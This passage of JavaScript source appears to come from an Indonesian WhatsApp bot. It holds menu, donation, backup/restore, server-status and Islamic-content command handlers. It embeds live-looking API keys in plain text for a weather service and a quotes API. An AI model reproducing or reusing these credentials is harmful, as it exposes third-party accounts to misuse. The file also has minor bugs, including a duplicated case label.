  { "header": "youtubesilver", "title": "Fitur youtubesilver", "id": ".youtubesilver" },
  { "header": "zombie3d", "title": "Fitur zombie3d", "id": ".zombie3d" }

]
`
let namaMenu=`Ephoto360 Menu 📷
`
await sendButMenu(teksnya,json,namaMenu)


Aira.sendMessage(m.chat, {audio: fs.readFileSync(setting.audio_di_bagian_menu), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
}
break
case 'logomenu':{
let mundur = hitungmundur(1, 1, 2025)
let lebaran = hitungmundur(17, 8, 2024) 
await loading() 
/*await Aira.sendMessage(m.chat, {
text: logoMenu(role, ucapanWaktu, pushname, lebaran, mundur, upload, download, ownerName, botName, jam, tanggal, runtime, isCreator, isPremium, m.sender, limitCount, limit, gcount, glimit, balance, prefix),
contextInfo: {
externalAdReply: {  
title: botName,
body: '',
thumbnailUrl: pathimg,
sourceUrl: gcwa,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: fkontak})*/

let teksnya= await logoMenu(role, ucapanWaktu, pushname, lebaran, mundur, upload, download, ownerName, botName, jam, tanggal, runtime, isCreator, isPremium, m.sender, limitCount, limit, gcount, glimit, balance, prefix)
let json=`[
  { "header": "Avataroverwatch", "title": "Fitur avataroverwatch", "id": ".avataroverwatch" },
  { "header": "Logoaccording", "title": "Fitur logoaccording", "id": ".logoaccording" },
  { "header": "Mascotstyle", "title": "Fitur mascotstyle", "id": ".mascotstyle" },
  { "header": "Letterlogos", "title": "Fitur letterlogos", "id": ".letterlogos" },
  { "header": "Bannerofpubg", "title": "Fitur bannerofpubg", "id": ".bannerofpubg" },
  { "header": "Bannerofapex", "title": "Fitur bannerofapex", "id": ".bannerofapex" },
  { "header": "Bannerofoverwatch", "title": "Fitur bannerofoverwatch", "id": ".bannerofoverwatch" },
  { "header": "Banneroffreefire", "title": "Fitur banneroffreefire", "id": ".banneroffreefire" },
  { "header": "Gunlogogaming", "title": "Fitur gunlogogaming", "id": ".gunlogogaming" },
  { "header": "Pencilsketch", "title": "Fitur pencilsketch", "id": ".pencilsketch" },
  { "header": "Companylogo", "title": "Fitur companylogo", "id": ".companylogo" },
  { "header": "Companylogo2", "title": "Fitur companylogo2", "id": ".companylogo2" },
  { "header": "Teamlogo", "title": "Fitur teamlogo", "id": ".teamlogo" },
  { "header": "Bannerofaov", "title": "Fitur bannerofaov", "id": ".bannerofaov" },
  { "header": "Fbgamepubgcover", "title": "Fitur fbgamepubgcover", "id": ".fbgamepubgcover" },
  { "header": "Banneroflol", "title": "Fitur banneroflol", "id": ".banneroflol" },
  { "header": "Anonymous", "title": "Fitur anonymous", "id": ".anonymous" },
  { "header": "Metalmascot", "title": "Fitur metalmascot", "id": ".metalmascot" },
  { "header": "Blueneon", "title": "Fitur blueneon", "id": ".blueneon" },
  { "header": "Coverbannerlol", "title": "Fitur coverbannerlol", "id": ".coverbannerlol" },
  { "header": "Pubglogomaker", "title": "Fitur pubglogomaker", "id": ".pubglogomaker" },
  { "header": "Colorfulpubg", "title": "Fitur colorfulpubg", "id": ".colorfulpubg" },
  { "header": "Astronotspace", "title": "Fitur astronotspace", "id": ".astronotspace" },
  { "header": "Wallpaperaov", "title": "Fitur wallpaperaov", "id": ".wallpaperaov" },
  { "header": "Maketeamlogo", "title": "Fitur maketeamlogo", "id": ".maketeamlogo" },
  { "header": "Circlemascotteam", "title": "Fitur circlemascotteam", "id": ".circlemascotteam" },
  { "header": "Wallpaperml", "title": "Fitur wallpaperml", "id": ".wallpaperml" },
  { "header": "Dragonballfb", "title": "Fitur dragonballfb", "id": ".dragonballfb" },
  { "header": "Effect3donbeach", "title": "Fitur effect3donbeach", "id": ".effect3donbeach" },
  { "header": "Cutegirlgamer", "title": "Fitur cutegirlgamer", "id": ".cutegirlgamer" }

]
`
let namaMenu=`Logo Menu 🖼
`
await sendButMenu(teksnya,json,namaMenu)


Aira.sendMessage(m.chat, {audio: fs.readFileSync(setting.audio_di_bagian_menu), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
}
break
case 'rules': case 'aturan': case 'aturanbot':{
var cpt = `Peraturan Penggunaan Bot :\n- Dilarang Spam\n- Dilarang Menelpon Bot\n- Dilarang Mengirim Virus Ke Bot\n\nCatatan :\nSemua Fitur Bot Di Lakukan Secara Otomatis Oleh Sistem Tanpa Ada Campur Tangan Owner, Dan Semua Informasimu Seperti Chat, Foto, Video Atau Vn Akan Aman Tanpa Di Sebar, Dan Jika Ada Balasan Yang Absurd Atau Sticker Absurd Ya Mungkin Owner Lagi Gabut Dan Butuh Temen Chat :v`
await Aira.sendMessage(m.chat, {
text: cpt,
contextInfo: {
externalAdReply: {  
title: botName,
body: '',
thumbnailUrl: pathimg,
sourceUrl: gcwa,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: fkontak})
}
break
case 'infobot': case 'info': case 'botinfo':{
addCountCmd('#infobot', m.sender, _cmd)
var capt = `_*${botName} Information*_

*• Name :* ${Aira.user.name}
*• Number :* ${botNumber.split("@")[0]}
*• Owner :* ${prefix}owner
*• Total Pengguna :* ${pendaftar.length}
*• Prefix :* ${prefix}
`
await Aira.sendMessage(m.chat, {
text: capt,
contextInfo: {
externalAdReply: {  
title: botName,
body: '',
thumbnailUrl: pathimg,
sourceUrl: gcwa,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: fkontak})
}
 break
case 'donate': case 'donasi':
addCountCmd('#donate', m.sender, _cmd)
var cp = `Hai Kak, Ingin Donasi?, Silahkan Donasi Ke Payment Yang Ada Di Bawah, Dengan Kamu Berdonasi Berarti Kamu Berkontribusi Dalam Perkembangan Bot Ini..\n❏──「 *Payment* 」\n│ • *Trakteer:* ${setting.trakteer}\n│ • *Saweria:* ${setting.saweria}\n❏──────────────๑\n\nTerima Kasih Yang Sudah Donasi, Berapapun Donasi Kamu Akan Sangat Saya Hargain >,<`
await Aira.sendMessage(m.chat, { image: fs.readFileSync(setting.fotoDonasi), caption: cp}, {quoted:fkontak})
break;
case 'pay': case 'payment':
var pay = `Halo Kak Untuk Pembayaran Bisa Scan Qr Tersebut Atau Bisa Dengan Pembayaran Lain Silahkan Hubungi Owner`
await Aira.sendMessage(m.chat, {image: fs.readFileSync(setting.fotoDonasi), caption: pay}, {quoted:fkontak})
break
case 'dashboard':
addCountCmd('#dashboard', m.sender, _cmd)
var posi = await getPosiCmdUser(m.sender, _cmdUser)
_cmdUser[posi].db.sort((a, b) => (a.count < b.count) ? 1 : -1)
_cmd.sort((a, b) => (a.count < b.count) ? 1 : -1)
var posi = await getPosiCmdUser(m.sender, _cmdUser)
var jumlahCmd = _cmd.length
if (jumlahCmd > 10) jumlahCmd = 10
var jumlah = _cmdUser[posi].db.length
if (jumlah > 5) jumlah = 5
var totalUser = 0
for (let x of _cmdUser[posi].db) {
totalUser = totalUser + x.count
}
var total = 0
for (let o of _cmd) {
total = total + o.count
}
var teks = `*√ DASHBOARD*\n\n*HIT*\n• GLOBAL : ${total}\n• USER : ${totalUser}\n\n`
teks += `*Most Command Global*\n`
for (let u = 0; u < jumlahCmd; u ++) {
teks += `• ${_cmd[u].nama} : ${_cmd[u].count}\n`
}
teks += `\n*Most Command User*\n`
for (let i = 0; i < jumlah; i ++) {
teks += `• ${_cmdUser[posi].db[i].nama} : ${_cmdUser[posi].db[i].count}\n`
}
newReply(teks)
break
case 'owner': case 'creator': {
newReply('Anda mencari owner saya? tenang saya akan memberitahu owner saya bahwa anda mencarinya')
Aira.sendMessage(setting.ownerNumber[0],{text: 'Hallo tuan ada yang nyari kamu nih buka wa bot yah\npesan: '+text?text:'tanpa pesan'})
//await Aira.sendContact(m.chat, ownerNumber.map( i => i.split("@")[0]), m)
//await Aira.sendMessage(m.chat, {audio: fs.readFileSync(setting.audio_di_bagian_owner), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
}
break

case 'noowner': case 'creator': {

await Aira.sendContact(m.chat, ownerNumber.map( i => i.split("@")[0]), m)
await Aira.sendMessage(m.chat, {audio: fs.readFileSync(setting.audio_di_bagian_owner), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
}
break

case 'totalfitur':{
const totalFitur = () =>{
let mytext = fs.readFileSync("./aira.ryujin.js").toString()
let numUpper = (mytext.match(/case '/g) || []).length;
 return numUpper }
reply(`Total Bot Features Are ${totalFitur()}`)}
break

case 'ambildatabase': case 'getdb':{
if (!isCreator) return newReply(mess.OnlyOwner)
newReply(mess.wait);
const archiver = require('archiver')
const output = fs.createWriteStream('./database.zip');
const archive = archiver('zip', { zlib: {level: 9 } });
archive.pipe(output);
archive.directory('./database', false);
await archive.finalize();
const zipFile = fs.readFileSync('./database.zip');
//await Aira.sendMessage(message.from, zipFile, MessageType.document, { mimetype: 'application/zip', filename: 'database.zip' });
await Aira.sendMessage(m.chat, { document: zipFile , mimetype: 'application/zip', fileName: 'database.zip' }, { quoted: m })
// Menghapus file ZIP setelah dikirim
fs.unlinkSync('./database.zip');
}
break
case 'backupsc': case 'backup':{
if (!isCreator) return newReply(mess.OnlyOwner)
newReply(mess.wait);
/*const archiver = require('archiver')
const output = fs.createWriteStream('./airaai.zip');
const archive = archiver('zip', { zlib: {level: 9 } });
archive.pipe(output);
archive.directory('./', false);
await archive.finalize();*/
const zipFile = fs.readFileSync('./airaai.zip');
//await Aira.sendMessage(message.from, zipFile, MessageType.document, { mimetype: 'application/zip', filename: 'airaai.zip' });
await Aira.sendMessage(m.chat, { document: zipFile , mimetype: 'application/zip', fileName: 'airaai.zip' }, { quoted: m })
// Menghapus file ZIP setelah dikirim
fs.unlinkSync('./airaai.zip');
}
break

case 'backupdb':{
if (!isCreator) return newReply(mess.OnlyOwner)
newReply(mess.wait);
async function backupData2(folderdb,dbName,lognya,exit) {
    const client = new MongoClient(uri);
    const backupLog = [];
    try {
        await client.connect();
        const db = client.db(dbName);
        const files = fs.readdirSync(folderdb).filter(file => file.endsWith('.json'));

        for (const file of files) {
            const collectionName = path.basename(file, '.json');
            const collection = db.collection(collectionName);

            const data = JSON.parse(fs.readFileSync(path.join(folderdb, file), 'utf-8'));
            await collection.deleteMany({}); // Hapus semua data yang ada sebelum mengimpor
            if (data.length > 0) {
            try{
            await collection.insertMany(data);
            console.log(`Data untuk koleksi ${collectionName} berhasil diimpor dari ${file} try 1`);
            backupLog.push({ database: dbName, collection: collectionName, 'try': 1 });
            }
            catch(err){
            try{
            const formattedData = data.map(item => ({ _id: item }));
            await collection.insertMany(formattedData);
            console.log(`Data untuk koleksi ${collectionName} berhasil diimpor dari ${file} try 2`);
            backupLog.push({ database: dbName, collection: collectionName, 'try': 2 });
            }
            catch (err){
            //console.log(err)
            if (Array.isArray(data)) {
                formattedData = data.map(item => ({ _id: item }));
            } else {
                formattedData = Object.values(data);
            }

            // Hapus duplikat berdasarkan _id
            const uniqueData = Array.from(new Set(formattedData.map(item => item._id)))
                                    .map(id => formattedData.find(item => item._id === id));

            if (uniqueData.length > 0) {
                await collection.deleteMany({}); // Hapus semua data yang ada sebelum mengimpor
                await collection.insertMany(uniqueData);
                console.log(`Data untuk koleksi ${collectionName} berhasil diimpor dari ${file} try 4`);
            } else {
                console.log(`File ${file} kosong atau tidak mengandung data yang valid.`);
            }
                backupLog.push({ database: dbName, collection: collectionName, 'try': 4 });

            }
            }
            }
             else {
                try{const formattedData2 = Object.values(data);
                await collection.insertMany(formattedData2);
                console.log(`Data untuk koleksi ${collectionName} berhasil diimpor dari ${file} try 3`);
                backupLog.push({ database: dbName, collection: collectionName, 'try': 3 });
                }
              catch (err){
               // console.log("try3 gagal")
                console.log(`File ${file} kosong atau tidak mengandung data yang valid.`);
              }
}


        }
    } catch (err) {
        console.error(err);
    } finally {
        await client.close();
        if(exit==='1'){
        backupData2('./database/user','database2','./log/backupLog2','2');}
        else if(exit==='2'){
        backupData2('./log','logbackup','backupLog3','3')
        }
       newReply(folderdb+' berhasil dicadangkan')
        await fs.writeFileSync(lognya+'.json', JSON.stringify(backupLog, null, 2));
    }
}
backupData2('./database','database1','./log/backupLog','1');

}
break

case 'restoredb': case 'rdb':{
if (!isCreator) return newReply(mess.OnlyOwner)
newReply(mess.wait);

async function restoreData(folderdb,dbName,lognya,exit) {
    const client = new MongoClient(uri);

    try {
        await client.connect();
        const db = client.db(dbName);
        const collections = await db.listCollections().toArray();

        // Baca dan parse file backup_log.json
        const backupLog = JSON.parse(fs.readFileSync(lognya+'.json', 'utf-8'));

        for (const collectionInfo of collections) {
            const collectionName = collectionInfo.name;
            const collection = db.collection(collectionName);
            const data = await collection.find({}).toArray();
            let formattedData;

            // Cari entry yang sesuai di backup_log
            const logEntry = backupLog.find(entry => entry.collection === collectionName);

            if (logEntry) {
                switch (logEntry.try) {
                    case 1:
                        formattedData = data.map(({ _id, ...rest }) => rest);
                        break;
                    case 2:
                        formattedData = data.map(item => item._id);
                        break;
                    case 3:
                        formattedData = data.reduce((acc, item) => {
                            acc[item.id] = {
                                id: item.id,
                                time: item.time
                            };
                            return acc;
                        }, {});
                        break;
                    case 4:
                        formattedData = data.map(item => item._id);
                        break;
                    default:
                        formattedData = data;  // Default to original data if try is not recognized
                }
            } else {
                formattedData = data;  // Default to original data if no log entry is found
            }

            const outputPath = path.join(folderdb, `${collectionName}.json`);
            fs.writeFileSync(outputPath, JSON.stringify(formattedData, null, 2));
            console.log(`Backup koleksi ${collectionName} berhasil disimpan di ${outputPath}`);
        }
    } catch (err) {
        console.error(err);
    } finally {
        newReply(folderdb+' berhasil dimuat')
        await client.close();
        if(exit==='1'){
        restoreData('database','database1','./log/backupLog','2');
        }
        else if(exit==='2'){
        restoreData('./database/user','database2','./log/backupLog2','3');}
        else if (exit==='3'){
        newReply('restarting...')
        await sleep(3000)
        process.exit()
        }

    }
}

restoreData('./log','logbackup','backupLog3','1');
}
break


case  'ambilfitur': case 'getcase':{
try{
if (!isCreator) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
if (!q) return m.reply(`🚩 Example ${prefix + command} listmenu`)
newReply(mess.wait);
const getCase = (cases) => {
return "case  "+`'${cases}'`+fs.readFileSync("./aira.ryujin.js").toString().split('case \''+cases+'\'')[1].split("break")[0]+("break")
}
let nana = await getCase(q)
m.reply(nana)
} catch(err){
console.log(err)
m.reply(`🚩 Case ${q} tidak di temukan`)
 }}
break

case 'bikingrup':case 'makegc': case 'creategc':{
if (!isCreator) return newReply(mess.onlyOwner)
if (!text) return m.reply('_Masukkan Nama Grup!_')
try{
m.reply(mess.wait)
let gcbaru = await Aira.groupCreate(text, [m.sender])
console.log(gcbaru)
let link = await Aira.groupInviteCode(gcbaru.id)
console.log(link)
let url = 'https://chat.whatsapp.com/' + link;
/// console.log(chalk.bold.red('Membuat Grup: ' + group.gid + '\nNama Grup: ' + text + '\n\nViolet'))
await m.reply('_Berhasil Membuat Grup *' + text + '*_\n\n*Nama:* ' + text + '\n*ID:* ' + gcbaru.id + '\n*Link:* ' + url)
} catch (e) {
m.reply(`Error `+e)
}
}
break
case 'lopyu': {
if (!isCreator) return newReply('Lu Siapa Gw Ga Kenal Gausah Gatel Lopyu" Segala Anj')
await Aira.sendMessage(m.chat, {audio: fs.readFileSync('./media/sound/lopyou.mp3'), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
}
break
case 'cekdrive': case 'drive':{
var result = await nou.drive.info();
addCountCmd('#cekdrive', m.sender, _cmd)
newReply(`*Drive Server Info*\n\n *• Total :* ${result.totalGb} GB\n *• Used :* ${result.usedGb} GB (${result.usedPercentage}%)\n *• Free :* ${result.freeGb} GB (${result.freePercentage}%)`)}
break
case 'cekbandwidth': case 'bandwidth':{
newReply(mess.wait);
addCountCmd('#cekbandwidth', m.sender, _cmd)
var { download, upload } = await checkBandwidth();
newReply(`*Bandwidth Server*\n\n*>* Upload : ${upload}\n*>* Download : ${download}`)}
break
case 'cekprem': case 'cekpremium':{
if (!isPremium) return newReply(`Kamu bukan user premium, kirim perintah *${prefix}daftarprem* untuk membeli premium`)
addCountCmd('#cekpremium', m.sender, _cmd)
if (isCreator) return newReply(`Khusus user aja bkn untuk owner`)
if (_prem.getPremiumExpired(m.sender, premium) == "PERMANENT") return newReply(`PERMANENT`)
let cekvip = ms(_prem.getPremiumExpired(m.sender, premium) - Date.now())
let premiumnya = `*Expire :* ${cekvip.days} day(s) ${cekvip.hours} hour(s) ${cekvip.minutes} minute(s)`
newReply(premiumnya)}
break
case 'listpremium': case 'listprem':
if (!isCreator) return newReply(`Khusus owner`)
addCountCmd('#listpremium', m.sender, _cmd)
let txt = `*List Premium User*\nJumlah : ${premium.length}\n\n`
let men = [];
for (let i of premium) {
men.push(i.id)
txt += `*ID :* @${i.id.split("@")[0]}\n`
if (i.expired === 'PERMANENT') {
let cekvip = 'PERMANENT'
txt += `*Expire :* PERMANENT\n\n`
} else {
let cekvip = ms(i.expired - Date.now())
txt += `*Expire :* ${cekvip.days} day(s) ${cekvip.hours} hour(s) ${cekvip.minutes} minute(s) ${cekvip.seconds} second(s)\n\n`
}
}
Aira.sendTextWithMentions(m.chat, txt, m)
break
case 'listsewa':{
if (!isCreator) return newReply(`Khusus owner`)
let list_sewa_list = `*LIST-SEWA-GROUP*\n\n*Total:* ${sewa.length}\n\n`
let data_array = [];
for (let x of sewa) {
addCountCmd('#listsewa', m.sender, _cmd)
list_sewa_list += `*Name:* ${await getGcName(x.id)}\n*ID :* ${x.id}\n`
if (x.expired === 'PERMANENT') {
let ceksewa = 'PERMANENT'
list_sewa_list += `*Expire :* PERMANENT\n\n`
} else {
let ceksewa = ms(x.expired - Date.now())
list_sewa_list += `*Expire :* ${ceksewa.days} day(s) ${ceksewa.hours} hour(s) ${ceksewa.minutes} minute(s) ${ceksewa.seconds} second(s)\n\n`
}
}
Aira.sendMessage(m.chat, { text: list_sewa_list }, { quoted: m })}
break
case 'ping': case 'botstatus': case 'statusbot': {
  const used = process.memoryUsage()
  const cpus = os.cpus().map(cpu => {
      cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
return cpu
  })
  const cpu = cpus.reduce((last, cpu, _, { length }) => {
      last.total += cpu.total
      last.speed += cpu.speed / length
      last.times.user += cpu.times.user
      last.times.nice += cpu.times.nice
      last.times.sys += cpu.times.sys
      last.times.idle += cpu.times.idle
      last.times.irq += cpu.times.irq
      return last
  }, {
      speed: 0,
      total: 0,
      times: {
    user: 0,
    nice: 0,
    sys: 0,
    idle: 0,
    irq: 0
  }
  })
  let timestamp = speed()
  let latensi = speed() - timestamp
  neww = performance.now()
  oldd = performance.now()
  respon = `
Kecepatan Respon ${latensi.toFixed(4)} _Second_ \n ${oldd - neww} _miliseconds_\n\nRuntime : ${runtime(process.uptime())}

💻 Info Server
RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}

_NodeJS Memory Usaage_
${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`).join('\n')}

${cpus[0] ? `_Total CPU Usage_
${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}
_CPU Core(s) Usage (${cpus.length} Core CPU)_
${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`).join('\n\n')}` : ''}
  `.trim()
await Aira.sendMessage(m.chat, {
text: respon, 
contextInfo: {
externalAdReply: {  
title: botName,
body: '',
thumbnailUrl: pathimg,
sourceUrl: gcwa,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: fkontak})
}
break
/*case 'restart':{
if (!isCreator) return m.reply(mess.onlyOwner)
txts = `SUCCES...`
m.reply(txts)
await sleep(2000)
let cp = require('child_process')
let { promisify } = require('util')
let exec = promisify(cp.exec).bind(cp)
let o
try {
o = exec('pm2 restart all')
} catch (e) {
o = e
} finally {
let { stdout, stderr } = o
}
}
Aira.sendMessage('sukses')
break*/
case 'shutdown' : case 'restart' :
if (!isCreator && !isPremium) return reply(mess.OnlyPrem)
reply(`Bye...`)
await sleep(3000)
process.exit()
break

case 'infogempa':{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
let tod = await fetchJson(`https://api.ouzen.xyz/information/bmkg/gempa?apikey=${setting.ZenzKey}`)
const tanggal = tod.result.tanggal
const date = tod.result.datetime
const jam = tod.result.jam
const koordinat = tod.result.coordinates
const lintang = tod.result.lintang
const bujur = tod.result.bujur
const magnitudo = tod.result.magnitude
const kedalaman = tod.result.kedalaman
const wilayah = tod.result.wilayah
const potensi = tod.result.potensi
const dirasakan = tod.result.dirasakan

var capt = `_*Info Gempa*_

*• Tanggal :* ${tanggal}
*• Datetime :* ${date}
*• Jam :* ${jam}
*• Koordinat :* ${koordinat}
*• Lintang :* ${lintang}
*• Bujur :* ${bujur}
*• Magnitudo :* ${magnitudo}
*• Kedalaman :* ${kedalaman}
*• Wilayah :* ${wilayah}
*• Potensi :* ${potensi}
*• Dirasakan :* ${dirasakan}
`
await Aira.sendMessage(m.chat, { image: {url: tod.result.shakemap}, caption: capt}, {quoted:fkontak})
}
limitAdd(m.sender, limit)
break
case 'infocuaca': case 'cuaca':{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!q) throw `_Contoh_\n${prefix+command} palembang`
let api_cuaca = '18d044eb8e1c06eaf7c5a27bb138694c'
let unit_cuaca = 'metric'
let nama_kota = q
let cuaca = await fetchJson(`http://api.openweathermap.org/data/2.5/weather?q=${nama_kota}&units=${unit_cuaca}&appid=${api_cuaca}`)
let text_cuaca =`*INFO CUACA*

*Nama:* ${cuaca.name + "," + cuaca.sys.country}
*Longitude:* ${cuaca.coord.lon}
*Latitude:* ${cuaca.coord.lat}
*Suhu:* ${cuaca.main.temp + " C"}
*Angin:* ${cuaca.wind.speed + " m/s"}
*Kelembaban:* ${cuaca.main.humidity + "%"}
*Cuaca:* ${cuaca.weather[0].main}
*Keterangan:* ${cuaca.weather[0].description}
*Udara:* ${cuaca.main.pressure + " HPa"}`
reply(text_cuaca)
}
limitAdd(m.sender, limit)
break
case 'kisahnabi':{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return newReply(`Ketik nama Nabi\nContoh : ${prefix+command} Muhammad`) 
try{
let tod = await fetchJson(`https://api.zeeoneofc.my.id/api/islam/kisahnabi?nabi=${text}&apikey=${setting.BotKey}`)
const name = tod.result.name
const ultah = tod.result.birth
const kematian = tod.result.death_age
const asal = tod.result.country_from
const cerita = tod.result.story
var kisah = `_*Kisah Nabi*_
Nama Nabi : ${name}
Hari Kelahiran : ${ultah}
Wafat Pada Umur : ${kematian}
Asal : ${asal}

Kisah Nabi *${name}* :
${cerita}`
newReply(kisah) 
}catch (error) {
newReply(`Ketik Nama Nabi Yang Valid`);
}
limitAdd(m.sender, limit)
}
break
case 'asmaulhusna':{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
try{
let tod = await fetchJson(`https://api.zeeoneofc.my.id/api/islam/asmaulhusna?apikey=${setting.BotKey}`)
const ke = tod.result.index
const latin = tod.result.latin
const arab = tod.result.arabic
const indo = tod.result.translation_id
const english = tod.result.translation_en
var asmaul = `_*Random Asmaul Husna*_
Asmaul Husna Ke : ${ke}
Teks Arab : ${arab}
Teks Latin : ${latin}
Arti Dalam Bahasa Indonesia : ${indo}
Arti Dalam Bahasa Inggris : ${english}`
newReply(asmaul) 
}catch (error) {
newReply(`Maaf Terjadi Kesalahan`);
}
limitAdd(m.sender, limit)
}
break
case 'listsurah': case 'listsurat':{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
try{
let tod = await fetchJson(`https://api.zeeoneofc.my.id/api/islam/listsurah?apikey=${setting.BotKey}`)
const list = tod.result
var surah = `_*List Surah*_

${list}`
newReply(surah) 
}catch (error) {
newReply(`Maaf Terjadi Kesalahan`);
}
limitAdd(m.sender, limit)
}
break
case 'randomquran':{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
try{
let tod = await fetchJson(`https://api.zeeoneofc.my.id/api/islam/randomquran?apikey=${setting.BotKey}`)
const audio = tod.result.resources.ayah.audio.primary
const nama = tod.result.resources.nameOfSurah.long
const latin = tod.result.resources.nameOfSurah.transliteration.id
const nomer = tod.result.resources.numberOfSurah
const juz = tod.result.resources.ayah.meta.juz
const ayat = tod.result.resources.totalAyah
const ayatke = tod.result.resources.numberOfAyah
const teks = tod.result.resources.ayah.text.arab
const trans = tod.result.resources.ayah.text.transliteration.en
const artiid = tod.result.resources.ayah.translation.id
const artien = tod.result.resources.ayah.translation.en
const tafsir = tod.result.resources.ayah.tafsir.id.long
var quran = `_*Random Quran*_
Quran : ${nama}
Teks Latin : ${latin}
Surat Ke : ${nomer}
Juz : ${juz}
Total Ayat : ${ayat}
Ayat Ke : ${ayatke}

Isi Ayat : ${teks}

Latin : ${trans}

Arti Dalam Bahasa Indonesia : ${artiid}

Arti Dalam Bahasa Inggris : ${artien}

Tafsir Surah : ${tafsir}`
await newReply(quran) 
await newReply('Tunggu Sebentar Audio Sedang Dikirim') 
await Aira.sendMessage(m.chat, {audio : {url : audio}, mimetype:'audio/mpeg'}, {quoted:m})}catch (error) {
newReply(`Maaf Terjadi Kesalahan`);
}
limitAdd(m.sender, limit)
}
break
case 'randomquran2':{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return newReply(`Masukkan Juznya\nContoh : ${prefix+command} 1`) 
try{
let tod = await fetchJson(`https://api.zeeoneofc.my.id/api/islam/randomquran2?juz=${text}&apikey=${setting.BotKey}`)
const audio = tod.result.resources.ayah.audio.primary
const nama = tod.result.resources.nameOfSurah.long
const latin = tod.result.resources.nameOfSurah.transliteration.id
const nomer = tod.result.resources.numberOfSurah
const juz = tod.result.resources.ayah.meta.juz
const ayat = tod.result.resources.totalAyah
const ayatke = tod.result.resources.numberOfAyah
const teks = tod.result.resources.ayah.text.arab
const trans = tod.result.resources.ayah.text.transliteration.en
const artiid = tod.result.resources.ayah.translation.id
const artien = tod.result.resources.ayah.translation.en
const tafsir = tod.result.resources.ayah.tafsir.id.long
var quran = `_*Random Quran*_
Quran : ${nama}
Teks Latin : ${latin}
Surat Ke : ${nomer}
Juz : ${juz}
Total Ayat : ${ayat}
Ayat Ke : ${ayatke}

Isi Ayat : ${teks}

Latin : ${trans}

Arti Dalam Bahasa Indonesia : ${artiid}

Arti Dalam Bahasa Inggris : ${artien}

Tafsir Surah : ${tafsir}`
await newReply(quran) 
await newReply('Tunggu Sebentar Audio Sedang Dikirim') 
await Aira.sendMessage(m.chat, {audio : {url : audio}, mimetype:'audio/mpeg'}, {quoted:m})}catch (error) {
newReply(`Maaf Terjadi Kesalahan`);
}
limitAdd(m.sender, limit)
}
break
case 'quranaudio': case 'alquranaudio': {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return newReply(`Masukkan Suratnya\nContoh : ${prefix+command} 1\n\nKetik .listsurah Untuk Melihat Daftar Surat`)  
try{
let tod = await fetchJson(`https://api.ouzen.xyz/islami/quran/audio/${text}?apikey=${setting.ZenzKey}`)
const audio = tod.result
await newReply('Tunggu Sebentar Audio Sedang Dikirim') 
await Aira.sendMessage(m.chat, {audio : {url : audio}, mimetype:'audio/mpeg'}, {quoted:m})}catch (error) {
newReply(`Maaf Terjadi Kesalahan`);
}
limitAdd(m.sender, limit)
}
break
case 'quotesbucin':{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
let tod = await fetchJson(`https://api.ouzen.xyz/randomtext/bucinquote?apikey=${setting.ZenzKey}`)
const bucin = tod.result.message
Aira.sendMessage(m.chat, {text: bucin}, {quoted: m})
}
limitAdd(m.sender, limit)
break
case 'quotesdilan':{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
let tod = await fetchJson(`https://api.ouzen.xyz/randomtext/dilanquote?apikey=${setting.ZenzKey}`)
const dilan = tod.result.message
Aira.sendMessage(m.chat, {text: dilan}, {quoted: m})
}
limitAdd(m.sender, limit)
break
case 'quotesjawa':{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
let tod = await fetchJson(`https://api.ouzen.xyz/randomtext/jawaquote?apikey=${setting.ZenzKey}`)
const jawa = tod.result.message
Aira.sendMessage(m.chat, {text: jawa}, {quoted: m})
}
limitAdd(m.sender, limit)
break
 case 'quotesanime':{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
let tod = await fetchJson(`https://api.betabotz.eu.org/api/random/quotesanime?apikey=38hWJG4F`)
